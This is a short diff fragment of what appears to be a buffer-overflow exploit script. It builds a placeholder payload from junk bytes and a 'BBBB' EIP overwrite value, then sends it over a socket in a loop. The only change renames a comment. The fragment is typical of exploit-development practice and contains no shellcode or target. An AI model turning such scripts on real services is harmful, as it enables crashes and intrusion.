@@ -13,7 +13,7 @@ eip = "BBBB"
 
 exploit = junk + eip + junk
 
-# sending junk
+# sending exploit
 while True:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
